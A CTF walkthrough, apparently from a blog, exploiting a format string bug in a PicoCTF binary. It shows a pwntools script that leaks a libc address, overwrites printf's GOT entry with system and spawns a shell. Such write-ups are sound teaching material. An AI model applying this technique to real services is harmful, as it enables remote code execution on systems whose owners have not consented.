---
layout: post
title: "PicoCTF 2024 — Format String Exploitation Walkthrough"
date: 2024-05-15
category: Pwn
difficulty: Medium
platform: PicoCTF
tags: [format-string, pwn, linux, libc]
excerpt: "Exploiting a classic format string vulnerability to leak libc addresses and achieve RCE via a one-gadget."
---

## Challenge Description

> We found a binary running on the server. Can you exploit the format string bug and get the flag?

Binary provided: `vuln` (64-bit ELF, partial RELRO, no PIE, stack canary)

---

## Analysis

```bash
checksec vuln
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

No PIE and partial RELRO — we can overwrite GOT entries!

Decompile in Ghidra. The vulnerability is obvious:

```c
char buf[0x40];
fgets(buf, 0x40, stdin);
printf(buf);  // <-- format string bug!
```

---

## Exploitation

### Step 1: Leak libc

Find the offset to the format string argument:

```python
from pwn import *

p = process('./vuln')
p.sendline(b'%p ' * 20)
print(p.recv())
```

Identify a libc address at offset `N`. Compute the libc base and the `system()` / `one_gadget` address.

### Step 2: Overwrite GOT

With no PIE, we know the GOT address of `printf`. Overwrite it with `system`:

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')

p = remote('challenge.picoctf.org', 12345)

# Leak
p.sendline(b'%15$p')
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 0xe7

log.success(f'libc @ {hex(libc.address)}')

# Overwrite printf@GOT with system
payload = fmtstr_payload(6, {elf.got['printf']: libc.symbols['system']})
p.sendline(payload)

# Trigger system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

<div class="tip">
  <div><strong>Tip</strong> Use <code>pwntools</code> <code>fmtstr_payload()</code> to auto-generate the write payload. Just pass the correct argument offset.</div>
</div>

---

## Flag

```
picoCTF{f0rm4t_str1ng5_4r3_d4ng3r0u5_a1b2c3d4}
```
